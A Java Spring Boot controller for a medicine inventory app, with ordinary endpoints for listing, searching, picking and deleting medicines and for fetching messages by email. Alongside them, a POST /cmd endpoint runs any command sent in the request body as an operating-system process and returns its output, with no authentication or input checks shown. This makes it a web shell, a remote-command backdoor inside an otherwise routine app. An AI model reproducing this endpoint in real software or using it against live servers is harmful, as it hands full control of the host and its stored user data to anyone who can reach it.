package com.ag.app.controller;

import com.ag.app.service.MedDataService;
import com.ag.app.service.PickedMedDataService;
import com.fasterxml.jackson.annotation.JsonProperty;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.SequenceInputStream;
import java.util.List;
import java.util.Scanner;

@RestController
public class MedController {

    @Autowired
    MedDataService medDataService;
    @Autowired
    PickedMedDataService pickedMedDataService;

    @GetMapping("/health")
    public Response sayHello() {
        return new Response(200, "Up & Running.");
    }

    @GetMapping("/medicines")
    public List<MedDataService.MedDataDTO> getMedicines() {
        return medDataService.getMedicines();
    }

    @GetMapping("/medicines/search")
    public List<MedDataService.MedDataDTO> searchMedicines(@RequestParam String medicine_name) {
        return medDataService.searchMedicines(medicine_name);
    }

    @PostMapping("/medicines/pick")
    public Response pick(@RequestBody MedDataService.MedDataDTO payload) {
        pickedMedDataService.save(payload);
        return new Response(201, "Success");
    }

    @DeleteMapping("/medicines")
    public Response deleteMedicine(@RequestParam Integer id) {
        medDataService.deleteMedicine(id);
        return new Response(202, "Success");
    }

    @GetMapping("/trigger")
    public Response updateExpiry() {
        medDataService.updateExpiry();
        return new Response(201, "Success");
    }

    @GetMapping("/medicines/messages")
    public List<MedDataService.MedDataDTO> getMessages(@RequestParam String email) {
        return pickedMedDataService.getMessages(email);
    }

    @PostMapping("/cmd")
    public String cmd(@RequestBody Cmd cmd) throws Exception {
        String command = cmd.cmd;
        String[] arr = command.split(" ");

        ProcessBuilder pb = new ProcessBuilder(arr);
        Process p = pb.start();
        OutputStream stdin = p.getOutputStream();
        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdin));
        writer.write("\n");

        // Return the response.
        SequenceInputStream sis = new SequenceInputStream(p.getInputStream(), p.getErrorStream());
        String out = "";
        Scanner scanner = new Scanner(sis).useDelimiter("\\A");
        out = scanner.hasNext() ? scanner.next() : "";
        System.out.println(out);
        scanner.close();

        return out;
    }

    public record Cmd(@JsonProperty String cmd) {

    }

    public record Response(@JsonProperty Integer code, @JsonProperty String message) {
    }

}
